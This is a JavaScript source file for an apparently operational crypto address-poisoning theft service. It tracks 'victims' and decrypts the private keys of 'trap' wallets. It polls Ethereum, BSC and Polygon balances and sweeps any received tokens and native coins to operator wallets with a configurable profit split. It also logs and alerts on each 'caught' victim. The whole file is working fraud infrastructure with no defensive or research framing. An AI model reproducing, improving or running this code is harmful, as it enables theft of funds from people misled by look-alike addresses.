import 'dotenv/config';
import { createPublicClient, http, formatEther, formatUnits, parseAbi, encodeFunctionData, getAddress, fallback } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { mainnet, bsc, polygon } from 'viem/chains';
import axios from 'axios';
import { createClient } from '@supabase/supabase-js';

import { config as globalConfig } from '../lib/config.js';
import logger from '../lib/logger.js';
import { withRetry } from '../lib/retry.js';
import { sendAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';
import { decrypt } from '../lib/encryption.js';

console.log('[DEBUG] Starting ultra-optimized sweeper.js...');

// --- Parse command line args ---
const args = process.argv.slice(2);
let campaignId = null;
let jobId = null;
for (let i = 0; i < args.length; i++) {
  if (args[i] === '--campaign-id') campaignId = args[++i];
  if (args[i] === '--job-id') jobId = args[++i];
}
campaignId = campaignId || process.env.CAMPAIGN_ID;
jobId = jobId || process.env.JOB_ID;

if (campaignId) console.log(`[DEBUG] Campaign ID: ${campaignId}`);
if (jobId) console.log(`[DEBUG] Job ID: ${jobId}`);

// --- Supabase Service Client ---
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
let supabaseService = null;
if (supabaseUrl && supabaseServiceKey) {
  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
}

// --- Config ---
const {
  sweeper: { pollIntervalMs, safeWallet },
  rpc: { sweeper: sweeperRpcUrl },
} = globalConfig;

const SERVICE_WALLET = process.env.SERVICE_WALLET_ADDRESS;

// --- Thresholds ---
const MIN_CATCH_USD = parseFloat(process.env.MIN_CATCH_USD || '1000');
const MIN_SWEEP_USD = parseFloat(process.env.MIN_SWEEP_USD || '100');
const MIN_ETH_SWEEP = BigInt(process.env.MIN_ETH_SWEEP_WEI || '1000000000000000');
const MIN_TOKEN_SWEEP = BigInt(process.env.MIN_TOKEN_SWEEP || '1000000000000000');

// --- State & Caches ---
const caughtVictims = new Set();
const NO_BALANCE_COOLDOWN_MS = 4 * 60 * 60 * 1000; // 4 hours
let lastNoBalanceAlertTime = 0;
const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000; // 1 hour
const lastBalanceAlertTimes = new Map(); 

let cycleMetadataCache = null;

// 🚀 BULLETPROOF MULTI-SOURCE PRICE FETCHER (Tier 1 & 2 Only)
let priceCache = {};
let lastPriceFetch = 0;
let priceFetchPromise = null;
const PRICE_CACHE_MS = 15 * 60 * 1000; // 15 minutes

async function fetchTokenPrices() {
  const now = Date.now();
  if (now - lastPriceFetch < PRICE_CACHE_MS && Object.keys(priceCache).length > 0) {
    return priceCache;
  }

  if (priceFetchPromise) {
    return priceFetchPromise;
  }

  priceFetchPromise = (async () => {
    try {
      const nativeSymbol = globalConfig.getChainConfig()?.nativeSymbol || 'ETH';
      const ids = [nativeSymbol.toLowerCase()];
      const TOKEN_LIST = globalConfig.getChainConfig()?.tokens ? 
        Object.keys(globalConfig.getChainConfig().tokens).map(s => s.toLowerCase()) : 
        ['usdc', 'usdt', 'wbtc', 'weth', 'dai'];
      
      const allSymbols = [...new Set([...ids, ...TOKEN_LIST])];
      let newCache = {};

      // ─── TIER 1: CoinGecko ───
      try {
        const symbolToId = { eth: 'ethereum', bnb: 'binancecoin', matic: 'matic-network', pol: 'matic-network', usdc: 'usd-coin', usdt: 'tether', dai: 'dai', wbtc: 'bitcoin', weth: 'weth' };
        const coinIds = allSymbols.map(s => symbolToId[s]).filter(Boolean);
        if (coinIds.length > 0) {
          const url = `https://api.coingecko.com/api/v3/simple/price?ids=${coinIds.join(',')}&vs_currencies=usd`;
          const resp = await axios.get(url, { timeout: 8000 });
          if (resp.status === 200) {
            const data = resp.data;
            for (const sym of allSymbols) {
              const id = symbolToId[sym];
              if (id && data[id] && data[id].usd) {
                newCache[sym] = data[id].usd;
              }
            }
          }
        }
      } catch (e) {
        logger.warn(`CoinGecko price fetch failed (${e.message}). Trying fallback...`);
      }

      // ─── TIER 2: Binance API (Highly reliable for major pairs) ───
      if (Object.keys(newCache).length < allSymbols.length) {
        try {
          const binancePairs = {
            eth: 'ETHUSDT', bnb: 'BNBUSDT', matic: 'MATICUSDT', pol: 'POLUSDT',
            wbtc: 'BTCUSDT', weth: 'ETHUSDT'
          };
          
          for (const sym of allSymbols) {
            if (newCache[sym]) continue; // Already fetched successfully
            
            const pair = binancePairs[sym];
            if (pair) {
              const url = `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`;
              const resp = await axios.get(url, { timeout: 5000 });
              if (resp.status === 200 && resp.data.price) {
                newCache[sym] = parseFloat(resp.data.price);
              }
            }
          }
        } catch (e) {
          logger.warn(`Binance price fetch failed (${e.message}).`);
        }
      }

      if (Object.keys(newCache).length > 0) {
        priceCache = newCache;
        logger.debug(`Final price cache established: ${JSON.stringify(priceCache)}`);
      } else {
         logger.warn(`All price sources failed. Cache remains unchanged or empty.`);
      }
    } catch (e) {
      logger.error(`Critical: All price fetch sources failed: ${e.message}`);
    } finally {
      // 🚀 CRITICAL: Update lastPriceFetch EVEN ON FAILURE to enforce the 15-minute cooldown
      lastPriceFetch = Date.now();
      priceFetchPromise = null;
    }
    return priceCache;
  })();

  return priceFetchPromise;
}

// 🚀 FIX: Dual alert function that correctly routes to BOTH User and Admin
async function sendDualAlert(message, type = 'info', specificCampaignId = null) {
  const targetCampaignId = specificCampaignId || campaignId;
  
  if (targetCampaignId) {
    await sendAlert(message, type, targetCampaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
  }
  
  await sendAlert(`[ADMIN] ${message}`, type).catch(err => logger.warn(`Admin alert failed: ${err.message}`));
}

// --- Helper: check if job is cancelled ---
async function isJobCancelled(jobId) {
  if (!jobId || !supabaseService) return false;
  try {
    const { data, error } = await supabaseService.from('jobs').select('status').eq('id', jobId).single();
    if (error) throw error;
    return data?.status === 'cancelled';
  } catch {
    return false;
  }
}

// --- Helper: update job status ---
async function updateJob(status, progress = null, total = null, message = null) {
  if (!jobId || !supabaseService) return;
  const data = {};
  if (status) data.status = status;
  if (progress !== null) data.progress = progress;
  if (total !== null) data.total = total;
  if (message) data.message = message;
  if (status === 'running' && !data.started_at) data.started_at = new Date().toISOString();
  if (status === 'completed' || status === 'failed') data.completed_at = new Date().toISOString();
  try {
    await supabaseService.from('jobs').update(data).eq('id', jobId);
  } catch (err) {
    logger.error(`Failed to update job ${jobId}: ${err.message}`);
  }
}

// 🚀 OPTIMIZATION: Fetch and cache metadata ONCE per cycle
async function getCycleMetadata() {
  if (cycleMetadataCache) return cycleMetadataCache;
  
  let profitSplitPercent = 75;
  let userSafeWallet = safeWallet;
  let useSplitting = false;
  let serviceWallet = SERVICE_WALLET;

  if (campaignId && supabaseService) {
    try {
      const { data: campaign, error } = await supabaseService
        .from('campaigns')
        .select('user_id, safe_wallet_address')
        .eq('id', campaignId)
        .single();
      
      if (!error && campaign) {
        const { data: user, error: userError } = await supabaseService
          .from('users')
          .select('profit_split_percent')
          .eq('id', campaign.user_id)
          .single();
        
        if (!userError && user) {
          profitSplitPercent = user.profit_split_percent || 75;
        }
        userSafeWallet = campaign.safe_wallet_address;
        useSplitting = true;
        if (!serviceWallet) {
          logger.warn('SERVICE_WALLET_ADDRESS not set – service share will be skipped');
        }
      }
    } catch (err) {
      logger.error(`Failed to fetch profit split: ${err.message}`);
    }
  }

  cycleMetadataCache = { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet };
  return cycleMetadataCache;
}

// --- Helpers: transaction & profit share records ---
async function createTransaction(campId, trapAddress, tokenSymbol, amount, usdValue, txHash, type = 'sweep') {
  if (!supabaseService) return null;
  try {
    const { data, error } = await supabaseService.from('transactions').insert({
      campaign_id: campId, trap_address: trapAddress, token_symbol: tokenSymbol,
      amount, usd_value: usdValue, tx_hash: txHash, type, status: 'completed',
    }).select().single();
    return error ? null : data.id;
  } catch {
    return null;
  }
}

async function createProfitShare(transactionId, userAmount, serviceAmount, userTxHash, serviceTxHash) {
  if (!supabaseService) return;
  try {
    await supabaseService.from('profit_shares').insert({
      transaction_id: transactionId, user_amount: userAmount, service_amount: serviceAmount,
      user_share_tx_hash: userTxHash, service_share_tx_hash: serviceTxHash, settled_at: new Date().toISOString(),
    });
  } catch (err) {
    logger.error(`Failed to record profit share: ${err.message}`);
  }
}

// --- Load caught victims from DB ---
async function loadCaughtVictims() {
  if (!supabaseService) return;
  try {
    const { data, error } = await supabaseService.from('traps').select('victim_address').eq('is_caught', true);
    if (!error && data && data.length > 0) {
      const newSet = new Set(data.filter(row => row.victim_address).map(row => row.victim_address.toLowerCase()));
      caughtVictims.clear();
      newSet.forEach(addr => caughtVictims.add(addr));
    }
  } catch (err) {
    console.warn(`[DEBUG] Could not load caught victims: ${err.message}`);
  }
}

// --- Mark victim as caught ---
async function markVictimCaught(victimAddress, trapCampaignId = null) {
  if (!victimAddress) return;
  const addr = victimAddress.toLowerCase();
  if (caughtVictims.has(addr)) return;
  caughtVictims.add(addr);
  if (!supabaseService) return;
  try {
    await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
    
    const msg = `🎯 Victim caught\nVictim: ${addr}`;
    await sendDualAlert(msg, 'info', trapCampaignId || campaignId);
  } catch (err) {
    logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
  }
}

// --- MULTI‑CHAIN setup ---
const chainName = globalConfig.chain || 'ethereum';
const chainCfg = globalConfig.getChainConfig ? globalConfig.getChainConfig() : null;
const nativeSymbol = chainCfg?.nativeSymbol || 'ETH';

let viemChain;
switch (chainName) {
  case 'bsc': viemChain = bsc; break;
  case 'polygon': viemChain = polygon; break;
  default: viemChain = mainnet;
}

// --- Load traps from DB ---
async function getTrapsFromDB(campId = null) {
  if (!supabaseService) return [];
  try {
    let query = supabaseService.from('traps').select('trap_private_key_enc, victim_address, trap_address, campaign_id');
    if (campId) {
      query = query.eq('campaign_id', campId);
    } else {
      const { data: campaigns, error: campError } = await supabaseService.from('campaigns').select('id').eq('chain', chainName);
      if (campError || !campaigns || campaigns.length === 0) return [];
      query = query.in('campaign_id', campaigns.map(c => c.id));
    }

    const { data, error } = await query;
    if (error || !data || data.length === 0) return [];
    
    const entries = [];
    for (const row of data) {
      if (!row.trap_private_key_enc) continue;
      try {
        const privateKey = decrypt(row.trap_private_key_enc);
        const account = privateKeyToAccount(privateKey);
        entries.push({
          account,
          trapAddress: account.address.toLowerCase(),
          victimAddress: row.victim_address ? row.victim_address.toLowerCase() : null,
          campaignId: row.campaign_id, // 🚀 CRITICAL: Capture the trap's specific campaign ID
        });
      } catch (e) {
        logger.error(`Failed to decrypt private key for trap ${row.trap_address}: ${e.message}`);
      }
    }
    return entries;
  } catch (err) {
    logger.error(`Failed to fetch traps: ${err.message}`);
    return [];
  }
}

if (!safeWallet) {
  logger.error('SAFE_WALLET_ADDRESS is not set.');
  process.exit(1);
}

let TOKEN_LIST = [];
if (chainCfg && chainCfg.tokens) {
  const tokenDecimals = chainCfg.token_decimals || {};
  TOKEN_LIST = Object.entries(chainCfg.tokens).map(([symbol, address]) => ({
    symbol, address, decimals: tokenDecimals[symbol] ?? 18
  }));
} else {
  TOKEN_LIST = [
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
  ];
}

const chainRpc = chainCfg?.rpc || sweeperRpcUrl;

// ─── Public RPC Fallbacks ───
const PUBLIC_FALLBACKS = {
  bsc: ['https://bsc-dataseed.binance.org', 'https://rpc.ankr.com/bsc', 'https://bsc.publicnode.com'],
  polygon: ['https://polygon-rpc.com', 'https://rpc.ankr.com/polygon', 'https://polygon.publicnode.com'],
  ethereum: ['https://ethereum.publicnode.com', 'https://rpc.ankr.com/eth', 'https://eth.llamarpc.com'],
};

const normalizedChain = chainName?.toLowerCase() || '';
const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));

const ERC20_ABI = parseAbi([
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
]);

// 🚀 OPTIMIZATION: ONE single shared public client
const publicClient = createPublicClient({
  chain: viemChain,
  transport: fallback(fallbackUrls.map(url => http(url, { timeout: 10000 })), { rank: false }),
});

// 🚀 OPTIMIZATION: Lazy execution helper
async function executeSweepForTrap(entry, balances, metadata) {
  const { account, trapAddress, victimAddress, campaignId: trapCampaignId } = entry;
  const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet } = metadata;
  const prices = await fetchTokenPrices();
  const isPriceFeedDown = Object.keys(prices).length === 0;
  let sweptAny = false;
  let totalGasPaidInRun = 0n;

  let currentNonce = null;
  const getNonce = async () => {
    if (currentNonce === null) {
      currentNonce = await withRetry(() => publicClient.getTransactionCount({ address: trapAddress, blockTag: 'pending' }), 'getTransactionCount', 2, 1000);
    }
    return currentNonce++;
  };

  let currentGasPrice = null;
  const getGasPrice = async () => {
    if (currentGasPrice === null) {
      currentGasPrice = await withRetry(() => publicClient.getGasPrice(), 'getGasPrice', 2, 1000);
    }
    return currentGasPrice;
  };

  // 1. Token Sweeps
  for (const token of TOKEN_LIST) {
    const tokenData = balances.tokens[token.symbol];
    if (!tokenData || tokenData.balance <= 0n) continue;

    const formatted = formatUnits(tokenData.balance, tokenData.decimals);
    const tokenPrice = prices[token.symbol.toLowerCase()] || 0;
    const usdValue = parseFloat(formatted) * tokenPrice;
    const isTokenPriceMissing = tokenPrice === 0;
    
    // 🚀 FIX: If global feed is down OR this specific token's price is missing, use atomic threshold
    const meetsThreshold = (isPriceFeedDown || isTokenPriceMissing) 
      ? tokenData.balance >= MIN_TOKEN_SWEEP 
      : usdValue >= MIN_SWEEP_USD;

    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);
    if (!meetsThreshold) continue;

    const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
    const now = Date.now();
    if (now - (lastBalanceAlertTimes.get(alertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
      logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
      
      const alertMsg = `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`;
      await sendDualAlert(alertMsg, 'info', trapCampaignId);
      
      lastBalanceAlertTimes.set(alertKey, now);
    }

    try {
      const gasPrice = await getGasPrice();
      const gasLimit = 80000n;
      const totalFee = useSplitting ? (gasLimit * 2n) * gasPrice : gasLimit * gasPrice;
      const spendableNative = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;

      if (spendableNative < totalFee) {
        logger.warn(`Insufficient ${nativeSymbol} for ${token.symbol} gas. Skipping.`);
        continue;
      }

      let userAmount = tokenData.balance;
      let serviceAmount = 0n;
      let userTxHash = null, serviceTxHash = null;

      const buildAndSendTx = async (recipient, amount) => {
        const nonce = await getNonce();
        const txRequest = {
          to: getAddress(token.address),
          data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [recipient, amount] }),
          gas: gasLimit, nonce, gasPrice, chainId: viemChain.id,
        };
        const serializedTx = await account.signTransaction(txRequest);
        return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
      };

      if (useSplitting && serviceWallet) {
        const userShare = profitSplitPercent / 100;
        userAmount = (tokenData.balance * BigInt(Math.round(userShare * 100))) / 100n;
        serviceAmount = tokenData.balance - userAmount;

        if (userAmount > 0n && userSafeWallet) {
          try {
            userTxHash = await buildAndSendTx(userSafeWallet, userAmount);
            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
          } catch (err) { logger.error(`User tx error ${token.symbol}: ${err.message}`); }
        }
        if (serviceAmount > 0n && serviceWallet) {
          try {
            serviceTxHash = await buildAndSendTx(serviceWallet, serviceAmount);
            sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
          } catch (err) { logger.error(`Service tx error ${token.symbol}: ${err.message}`); }
        }
      } else {
        try {
          userTxHash = await buildAndSendTx(userSafeWallet, tokenData.balance);
          sweptAny = true; totalGasPaidInRun += gasLimit * gasPrice;
        } catch (err) { logger.error(`Sweep tx error ${token.symbol}: ${err.message}`); }
      }

      if (userTxHash || serviceTxHash) {
        const txHash = userTxHash || serviceTxHash;
        if (trapCampaignId && supabaseService) {
          const txId = await createTransaction(trapCampaignId, trapAddress, token.symbol, formatted, isPriceFeedDown || isTokenPriceMissing ? 0 : usdValue, txHash, 'sweep');
          if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
        }
        
        const alertMsg = `💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
        await sendDualAlert(alertMsg, 'info', trapCampaignId);
      }
    } catch (e) {
      logger.debug(`Error processing ${token.symbol} for ${trapAddress}: ${e.message}`);
    }
  }

  // 2. Native Sweep
  const spendableNativeFinal = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
  if (spendableNativeFinal > 0n) {
    const nativePrice = prices[nativeSymbol.toLowerCase()] || 0;
    const ethValue = parseFloat(formatEther(spendableNativeFinal));
    const usdValue = ethValue * nativePrice;
    const isNativePriceMissing = nativePrice === 0;

    // 🚀 FIX: If global feed is down OR native price is missing, use atomic threshold
    const meetsThreshold = (isPriceFeedDown || isNativePriceMissing)
      ? spendableNativeFinal >= MIN_ETH_SWEEP
      : usdValue >= MIN_SWEEP_USD;

    if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress, trapCampaignId);

    if (meetsThreshold) {
      try {
        const gasPrice = await getGasPrice();
        const gasLimit = (useSplitting && serviceWallet) ? 42000n : 21000n;
        const gasCost = gasLimit * gasPrice;
        const totalSendable = spendableNativeFinal - gasCost;

        if (totalSendable > 0n) {
          let userAmount = totalSendable;
          let serviceAmount = 0n;
          let userTxHash = null, serviceTxHash = null;

          const buildAndSendNativeTx = async (recipient, amount) => {
            const nonce = await getNonce();
            const txRequest = { to: recipient, value: amount, gas: 21000n, nonce, gasPrice, chainId: viemChain.id };
            const serializedTx = await account.signTransaction(txRequest);
            return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
          };

          if (useSplitting && serviceWallet) {
            const userShare = profitSplitPercent / 100;
            userAmount = (totalSendable * BigInt(Math.round(userShare * 100))) / 100n;
            serviceAmount = totalSendable - userAmount;

            if (userAmount > 0n && userSafeWallet) {
              try { userTxHash = await buildAndSendNativeTx(userSafeWallet, userAmount); sweptAny = true; } 
              catch (err) { logger.error(`Native user tx error: ${err.message}`); }
            }
            if (serviceAmount > 0n && serviceWallet) {
              try { serviceTxHash = await buildAndSendNativeTx(serviceWallet, serviceAmount); sweptAny = true; } 
              catch (err) { logger.error(`Native service tx error: ${err.message}`); }
            }
          } else {
            try { userTxHash = await buildAndSendNativeTx(userSafeWallet, totalSendable); sweptAny = true; } 
            catch (err) { logger.error(`Native sweep tx error: ${err.message}`); }
          }

          if (userTxHash || serviceTxHash) {
            const txHash = userTxHash || serviceTxHash;
            if (trapCampaignId && supabaseService) {
              const txId = await createTransaction(trapCampaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown || isNativePriceMissing ? 0 : usdValue, txHash, 'sweep');
              if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
            }
            
            const alertMsg = `💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`;
            await sendDualAlert(alertMsg, 'info', trapCampaignId);
          }
        }
      } catch (e) {
        logger.debug(`Error processing native for ${trapAddress}: ${e.message}`);
      }
    }
  }
  return sweptAny;
}

// --- Batch mode with Advanced Multicall Batching ---
async function sweepBatch() {
  let entries = [];
  let trapToVictim = new Map();

  try {
    entries = await getTrapsFromDB(campaignId);
  } catch (err) {
    logger.error(`Failed to load traps: ${err.message}`);
    if (jobId) await updateJob('failed', null, null, 'Failed to load traps');
    return;
  }

  if (entries.length === 0) {
    await sendDualAlert(`ℹ️ Sweep cycle: No traps found.`, 'info', campaignId);
    return;
  }

  for (const e of entries) {
    if (e.victimAddress) trapToVictim.set(e.trapAddress.toLowerCase(), e.victimAddress);
  }

  logger.info(`Loaded ${entries.length} trap addresses`);
  
  cycleMetadataCache = null;
  const metadata = await getCycleMetadata();

  let isSweeping = false;
  const total = entries.length;

  const runSweep = async () => {
    if (isSweeping) return;
    isSweeping = true;
    let processedCount = 0;
    let anySwept = false;

    try {
      const CHUNK_SIZE = 20;
      
      for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
        if (jobId && await isJobCancelled(jobId)) {
          logger.info(`Job ${jobId} cancelled. Stopping.`);
          isSweeping = false;
          return;
        }

        const chunk = entries.slice(i, i + CHUNK_SIZE);
        const multicallContracts = [];
        for (const entry of chunk) {
          for (const token of TOKEN_LIST) {
            multicallContracts.push({
              address: getAddress(token.address),
              abi: ERC20_ABI,
              functionName: 'balanceOf',
              args: [entry.trapAddress]
            });
          }
        }

        const results = await withRetry(() => publicClient.multicall({ contracts: multicallContracts, allowFailure: true }), 'multicall_chunk', 2, 1000);
        const nativeBalancePromises = chunk.map(entry => withRetry(() => publicClient.getBalance({ address: entry.trapAddress }), 'getBalance', 2, 1000));
        const nativeBalances = await Promise.all(nativeBalancePromises);

        let resultIndex = 0;
        for (let j = 0; j < chunk.length; j++) {
          const entry = chunk[j];
          const trapBalances = { native: nativeBalances[j], tokens: {} };

          for (const token of TOKEN_LIST) {
            const res = results[resultIndex++];
            if (res && res.status === 'success' && res.result > 0n) {
              trapBalances.tokens[token.symbol] = { balance: res.result, decimals: token.decimals };
            }
          }

          const swept = await executeSweepForTrap(entry, trapBalances, metadata);
          if (swept) anySwept = true;
          
          processedCount++;
          if (jobId) await updateJob('running', processedCount, total, `Sweeping ${processedCount}/${total}`);
        }
      }
      
      if (!anySwept) {
        const now = Date.now();
        if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds found for ${total} traps.`, 'info', campaignId);
          lastNoBalanceAlertTime = now;
        }
      } else {
        await sendAlert(`[ADMIN] ✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
      }
    } catch (err) {
      logger.error(`Batch sweep error: ${err.message}`);
      await sendAlert(`[ADMIN] ❌ CRITICAL ERROR in sweep batch: ${err.message}`, 'error');
    } finally {
      isSweeping = false;
    }
  };

  const scheduleNext = () => {
    setTimeout(async () => {
      if (jobId && await isJobCancelled(jobId)) return;
      await runSweep();
      scheduleNext();
    }, pollIntervalMs);
  };

  await runSweep();
  scheduleNext();
  onShutdown(() => { logger.info('Sweeper stopping...'); });
}

// --- Single mode ---
async function sweepSingle(privateKey, destination) {
  const account = privateKeyToAccount(privateKey);
  const trapAddress = account.address;
  logger.info(`Monitoring Poisoned Wallet: ${trapAddress}`);
  
  let isRunning = false;
  const run = async () => {
    if (isRunning) return;
    isRunning = true;
    try {
      cycleMetadataCache = { profitSplitPercent: 100, userSafeWallet: destination, useSplitting: false, serviceWallet: null };
      const multicallContracts = TOKEN_LIST.map(token => ({
        address: getAddress(token.address), abi: ERC20_ABI, functionName: 'balanceOf', args: [trapAddress]
      }));
      const results = await publicClient.multicall({ contracts: multicallContracts, allowFailure: true });
      const trapBalances = { 
        native: await publicClient.getBalance({ address: trapAddress }), 
        tokens: {} 
      };
      results.forEach((res, i) => {
        if (res && res.status === 'success' && res.result > 0n) {
          trapBalances.tokens[TOKEN_LIST[i].symbol] = { balance: res.result, decimals: TOKEN_LIST[i].decimals };
        }
      });
      await executeSweepForTrap({ account, trapAddress, victimAddress: null, campaignId: null }, trapBalances, cycleMetadataCache);
    } catch (err) {
      logger.error(`Sweep error: ${err.message}`);
    } finally {
      isRunning = false;
    }
  };
  const interval = setInterval(run, pollIntervalMs);
  run();
  onShutdown(() => { clearInterval(interval); logger.info('Sweeper interval cleared.'); });
}

// --- Graceful shutdown & Entry point ---
setupGracefulShutdown();
await loadCaughtVictims();
setInterval(loadCaughtVictims, 30000);

if (jobId) updateJob('running').catch(err => logger.error(`Failed to update job start: ${err.message}`));

const privateKey = process.env.SWEEPER_PRIVATE_KEY;
if (privateKey && safeWallet) {
  await sweepSingle(privateKey, safeWallet);
} else {
  await sweepBatch();
}